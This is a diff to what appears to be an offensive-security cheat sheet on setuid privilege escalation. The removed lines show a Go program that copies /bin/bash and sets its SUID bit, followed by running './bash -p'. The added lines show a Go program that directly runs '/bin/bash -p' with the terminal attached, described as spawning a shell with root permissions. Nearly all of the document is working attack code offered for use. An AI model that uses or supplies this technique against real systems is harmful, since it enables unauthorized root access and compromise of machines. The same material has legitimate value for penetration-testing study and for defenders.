@@ -91,11 +91,8 @@ sudo chmod +s setuid
 - `TARGET`
 
 ```batch
-:: Executing the Binary is going to create a BASH Binary with SUID Bit
+:: Executing the Binary is going to Spawn a Shell with Root Permissions
 ./setuid
-
-:: Run the BASH Binary Maintaining the Permissions
-./bash -p
 ```
 
 ```go
@@ -103,22 +100,19 @@ package main
 
 import (
 	"fmt"
+	"os"
 	"os/exec"
 	"runtime"
 )
 
 func execute() {
 
-	out, err := exec.Command("cp", "/bin/bash", ".").Output()
-	out, err = exec.Command("chmod", "+s", "./bash").Output()
-	
-	if err != nil {
-		fmt.Printf("%s", err)
-	}
+	out := exec.Command("/bin/bash", "-p")
 
-    output := string(out[:])
-    fmt.Println(output)
-    
+	out.Stdin = os.Stdin
+	out.Stdout = os.Stdout
+	out.Stderr = os.Stderr
+	_ = out.Run()
 }
 
 func main() {
